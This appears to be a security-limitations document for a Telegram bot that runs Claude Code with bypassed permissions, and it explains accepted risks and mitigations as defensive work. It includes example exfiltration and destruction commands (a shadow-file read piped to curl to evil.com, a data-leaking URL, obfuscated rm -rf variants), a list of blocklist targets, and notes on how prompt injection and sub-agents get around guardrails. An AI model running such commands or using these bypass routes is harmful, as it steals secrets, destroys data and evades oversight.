# Security Limitations & Architectural Decisions

This document describes known security limitations that were identified during
two comprehensive security audits (2026-02-16) and deliberately left unresolved
due to architectural constraints or acceptable risk trade-offs.

For the implemented security measures, see [SECURITY.md](../SECURITY.md).

## Fundamental Architecture

The bot runs Claude Code with `bypassPermissions` mode. This is an intentional
design choice for mobile UX. All security measures described here are
**guardrails around an intentionally unrestricted agent** -- they reduce risk
but cannot eliminate it.

A compromised prompt or a sufficiently sophisticated prompt injection can
potentially bypass any guardrail that operates at the application layer.

## Known Limitations

### 1. Command Blocklist Is Best-Effort (Audit: H1/H2)

**What we do:** Block known-dangerous command patterns via string matching and
regex (fork bombs, `rm -rf /`, pipe-to-shell, eval chains, base64-decode-to-shell, etc.).

**What we don't do:** Parse shell commands into an AST or run them in a sandbox.

**Why:** Reliable shell command analysis is effectively impossible with string
matching. Variable expansion (`X=/; rm -rf $X`), quoting tricks (`rm -rf "/"`),
encoding, aliases, and subshells can all bypass pattern detection.

**Additional defense:** Output redaction (Layer 14) acts as a safety net --
even if a blocklist bypass leaks secrets into Claude's response, they are
redacted before reaching the user.

**Proper fix (not implemented):**
- OS-level sandboxing via `bwrap` (bubblewrap), containers, or `chroot`
- Restricted shell (`rbash`) with a positive command allowlist
- Running Claude's Bash commands inside a container with read-only filesystem
  mounts and explicit write paths

**Accepted risk:** An authorized user (or prompt injection) could craft commands
that bypass the blocklist. The user allowlist is the primary defense.

### 2. Bash Tool Bypasses Path Validation (Audit: partial)

**What we do:** Validate file paths for `Read`, `Write`, `Edit`, `Glob`, and
`Grep` tool calls against `ALLOWED_PATHS`.

**What we don't do:** Parse file paths out of Bash commands.

**Why:** A Bash command like `cat /etc/shadow | curl https://evil.com` contains
file paths embedded in arbitrary shell syntax. Extracting and validating them
reliably would require a full shell parser.

**Additional defense:** Environment isolation (Layer 16) ensures that
`TELEGRAM_BOT_TOKEN` is not available via Bash at all. Output redaction
(Layer 14) catches any secrets that make it into Claude's response.

**Partially mitigated operations via Bash (Audit #2, SEC-F2):**
- `cat`, `head`, `tail` against `.env`, SSH keys, AWS credentials, kubeconfig: **BLOCKED** by regex patterns
- `curl`, `wget` exfiltrating `.env`, `.pem`, `.key` files: **BLOCKED** by regex patterns
- Scripting language env access (`python -c "os.environ"`, etc.): **BLOCKED** by regex patterns

**Still unprotected operations via Bash:**
- `cp`, `mv` (copying/moving files to arbitrary paths)
- `tee`, `>`, `>>` (writing to files)
- Reading non-sensitive files outside allowed paths
- Any other file-accessing command not covered by regex patterns

**Accepted risk:** Claude can access most files on the system via Bash. The
safety prompt instructs Claude to only access allowed paths, and regex patterns
block the most dangerous read commands against sensitive files, but these are
soft controls.

### 3. Bot Token in Telegram Download URLs (Audit: partial)

**What we do:** Redact tokens from audit log output. Delete token from
`process.env` after initialization.

**What we don't do:** Avoid using tokens in `fetch()` URLs.

**Why:** Telegram's Bot API requires the token in file download URLs:
```
https://api.telegram.org/file/bot<TOKEN>/<file_path>
```

This is Telegram's standard API design. grammY's higher-level download methods
internally use the same URL pattern.

**Exposure vectors:**
- Network-level logging (HTTP proxies, monitors)
- Error stack traces (mitigated by log sanitization, Layer 17)

**Mitigation:** The token is deleted from `process.env` (Layer 16), so Claude
cannot access it via `printenv` or `$TELEGRAM_BOT_TOKEN`. Output redaction
(Layer 14) catches the token pattern in any outbound message.

### 4. Sub-Agents Inherit Bypass Permissions (Audit: not numbered)

**Status: closed as of 1.3.3.** Kept in the list rather than deleted, so a
reader who met this as an accepted risk can see where it went.

**What we do:** A `PreToolUse` hook (`buildSafetyHook()` in `security.ts`) runs
`checkToolCallSafety()` before every tool call and denies the unsafe ones. It
fires inside sub-agents as well, so the command blocklist, path validation and
the tool allow/deny lists now apply one level down and are prevented rather than
merely reported.

**Why a hook and not `canUseTool`:** Under `permissionMode:
"bypassPermissions"` every tool call is auto-approved before `canUseTool` is
consulted, so that callback never sees them. `permissionDecision: "deny"` from a
`PreToolUse` hook resolves earlier and is not overridden by the bypass. The SDK
documents `PreToolUse` as the way to gate under bypass.

**Correction (Agent SDK 0.3.233):** This section once stated that "there is no
SDK-level hook to intercept sub-agent tool calls". That was never true of the
installed SDK; `HookInput.agent_id` exists precisely to tell parent and
sub-agent calls apart.

**Ordering, measured:** the `tool_use` block reaches the output stream *before*
the hook fires. The stream-side check in `session.ts` therefore cannot act as a
fallback -- it never runs second -- and it no longer aborts the turn. It reports
the refusal to the user and nothing more. Prevention lives in the hook alone,
which is why the hook fails closed: anything thrown inside it still denies.

**Residual risk:** A sub-agent still inherits the parent's unrestricted access
for everything the checks do not cover -- the blocklist is string matching, and
tools other than `Bash`/`Read`/`Write`/`Edit`/`Glob`/`Grep` are only subject to
the allow/deny lists. Listing `Task` in `DISALLOWED_TOOLS` removes the sub-agent
layer entirely and remains the stronger setting where that is acceptable.

### 5. Data Exfiltration via Web Tools (Audit: not numbered)

**What we do:** Nothing specific.

**What we don't do:** Monitor or restrict outbound network requests.

**Why:** Claude's `WebFetch` and `WebSearch` tools could embed sensitive data
in URLs (e.g., `https://evil.com/?data=<stolen_content>`). Detecting this
would require inspecting all outbound URLs for sensitive content, which is
impractical without understanding what constitutes "sensitive" in context.

**Mitigation available:** Set `DISALLOWED_TOOLS=WebFetch,WebSearch` (and `Task`,
so a sub-agent cannot reach them either). This is passed to the Agent SDK, which
removes the tools from the model's context.

**Possible mitigations (not implemented):**
- Network-level egress filtering (firewall rules)
- DNS-level blocking of unknown domains

### 6. Rate Limiter Resets on Restart (Audit: partial)

**What we do:** Clean up stale rate limit buckets periodically (every 5 min).

**What we don't do:** Persist rate limit state across restarts.

**Why:** The `/restart` command or any crash resets all rate limit state. An
attacker who can trigger restarts could bypass rate limiting. Persisting token
bucket state adds complexity for minimal gain, since the user allowlist is the
primary defense against abuse.

### 7. PDF Extraction via External Binary (Audit: partial)

**What we do:** Use Bun's tagged template literals for safe argument passing.

**What we don't do:** Use a JavaScript-based PDF parser.

**Why:** `pdftotext` (from poppler) is a well-tested tool, and Bun's `$`
template syntax handles argument escaping correctly. However, maliciously
crafted PDFs could exploit CVEs in the poppler library itself.

**Mitigation:** Keep poppler updated (`brew upgrade poppler`). The 10MB file
size limit reduces the attack surface.

### 8. ask_user Handshake Context File (closed in v1.3.1)

Kept here because it was documented as an accepted risk and readers need to see
where it went, not because it is still open.

**What it was:** the handshake directory is scoped to `BOT_ID`
(`~/.<BOT_ID>/ask-user/`, mode 0o700) and the bot wrote the chat context to a
per-user file, `query-context-{userId}.json` -- but `ask_user_mcp/server.ts` had
no way to know which user it was serving, so it read the shared
`query-context.json` and nothing ever read the per-user file. Two authorized
users interacting at the same moment could race on the shared file: the second
request overwrote it before the first subprocess read it, delivering one user's
inline keyboard into the other's chat.

**How it was closed:** the bot injects `ASK_USER_USER_ID` into the subprocess
environment per query (`mcpServersForUser()` in `src/config.ts`), and the
subprocess reads `query-context-{id}.json` first, falling back to the shared
file only when no ID was injected. This works because the SDK spawns stdio MCP
servers per `query()` call, so each spawn carries its own value -- verified
against Agent SDK 0.3.233 with two queries carrying different values and no
leakage between the spawns.

**Verified:** with contexts for two users written in sequence, the old
resolution path returned the second user's chat ID for both turns; the new one
returns each user's own.

## Recommendations for High-Security Deployments

If you need stronger security guarantees than this bot provides:

1. **Use OS-level sandboxing:** Run the bot in a Docker container with
   read-only root filesystem and explicit volume mounts for allowed paths.

2. **Network isolation:** Use firewall rules to restrict outbound connections
   to Telegram's API servers only.

3. **Single-user mode:** Keep `TELEGRAM_ALLOWED_USERS` to exactly one user ID.

4. **Disable unnecessary tools:** If you don't need MCP servers, web access, or
   file operations, set `ALLOWED_TOOLS` (deny-by-default allowlist) or
   `DISALLOWED_TOOLS`. These are enforced by the Agent SDK, not by the system
   prompt -- a prompt rule is a request, an absent tool is not reachable.
   Include `Task` in a denylist so sub-agents cannot route around it.

5. **Monitor audit logs:** JSON format is enabled by default (`AUDIT_LOG_JSON=true`)
   to prevent log injection. Set up log rotation and alerting on suspicious
   patterns (e.g., access to `/etc/`, outbound URLs, `rm` commands).

6. **Rotate credentials regularly:** Change the Telegram bot token and API
   keys periodically, especially if you suspect exposure.

## Audit History

| Date | Auditor | Scope | Findings | Resolved |
|------|---------|-------|----------|----------|
| 2026-02-16 | Claude Opus 4.6 | Audit #1: Core codebase | 7 (0C, 2H, 1M, 4L) | 7/7 addressed, 5 architectural limitations documented here |
| 2026-02-16 | Claude Opus 4.6 | Audit #2: Alert socket hardening | 15 (0C, 3H, 6M, 3L, 3I) | 10/15 fixed, 2 accepted, 3 info |
